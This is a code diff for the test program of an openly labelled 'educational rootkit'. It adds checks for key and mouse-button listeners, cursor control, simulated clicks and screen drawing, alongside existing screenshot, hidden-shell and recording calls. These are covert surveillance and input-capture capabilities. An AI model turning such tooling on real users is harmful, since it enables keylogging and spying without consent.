@@ -4,6 +4,7 @@
 #include <thread>
 
 #include "classes/dll_setup.hpp"
+#include "classes/vkToString.hpp"
 
 std::vector<std::thread> threads;
 
@@ -85,20 +86,93 @@ void handleEmulateKey() {
     std::cout << "\tOK -> pressed 'win' key.\n\n";
 }
 
+void handleMouseTP() {
+    std::cout << "Testing 'handleMouseTP'\n";
+    mouseTP(100, 100);
+    std::cout << "\tOK -> moved cursor to (100, 100)\n\n";
+}
+
+void handleMouseKey() {
+    std::cout << "Testing 'handleMouseKey'\n";
+    mouseKey("left_down");
+    Sleep(20);
+    mouseKey("left_up");
+    std::cout << "\tOK -> left-clicked.\n\n";
+}
+
+void handleMsgBox() {
+    std::cout << "Testing 'handleMsgBox'\n";
+    std::string res = "";
+    msgBox("whiteavocado-public-rootkit", "This is a test window", "yn", "i", res);
+    std::cout << "\tOK -> result: " << res << ".\n\n";
+}
+
+void handleDrawLine() {
+    std::cout << "Testing 'handleDrawLine'\n";
+    drawLine(100, 100, 200, 200, 2, 255, 0, 0, false);
+    std::cout << "\tOK -> drew line from (100, 100) to (200, 200)\n\n";
+}
+
+void handleGetScreenResolution() {
+    std::cout << "Testing 'handleGetScreenResolution'\n";
+    int x = 0;
+    int y = 0;
+    getScreenResolution(x, y);
+    std::cout << "\tOK -> result: (" << x << " X " << y << ")\n\n";
+}
+
+void handleKeyListener() {
+    std::cout << "Testing 'handleKeyListener'\n\tPress a key...\n";
+    std::string stat;
+    int VK = keyListener(stat);
+    std::cout << "\tOK -> result VK code: '" << VK << "' Real key: " << vkToString(VK) << "\n\n";
+}
+
+void handleButtonListener() {
+    std::cout << "Testing 'handleButtonListener'\n\tPress any mousebutton key...\n";
+    std::string stat;
+    int index = buttonListener(stat);
+    std::cout << "\tOK -> result: ";
+    std::string res = "none";
+    switch (index) {
+        case 0:
+            res = "left";
+            break;
+        case 1:
+            res = "right";
+            break;
+        case 2:
+            res = "middle";
+            break;
+    }
+    std::cout << res << " mousebutton.\n\n";
+}
+
 int main() {
     std::string msgBoxRes = "";
-    msgBox("whiteavocado-public-rootkit", "You are currently running a educational rootkit created by whiteavocado. For educational use ONLY!", "", "w", msgBoxRes);
+    msgBox("whiteavocado-public-rootkit", "You are currently running a educational rootkit created by whiteavocado. For educational use ONLY!\n\nDo you want to continue?", "yn", "w", msgBoxRes);
+    if (msgBoxRes != "yes") {
+        return 0;
+    }
 
     handleTakeScreenshot();
     handleQuietShell();
     handleShowInputDevices();
     handleBeginRecording();
-    Sleep(5000);
+    Sleep(1000);
     handleEndRecording();
     handleSaveRecording();
     handleGetUsername();
     handleGetSelfName();
     handleBeep();
     handleEmulateKey();
+    handleMouseTP();
+    handleMouseKey();
+    handleMsgBox();
+    handleDrawLine();
+    handleGetScreenResolution();
+    handleKeyListener();
+    handleButtonListener();
+    system("set /p end=");
     return 0;
 }
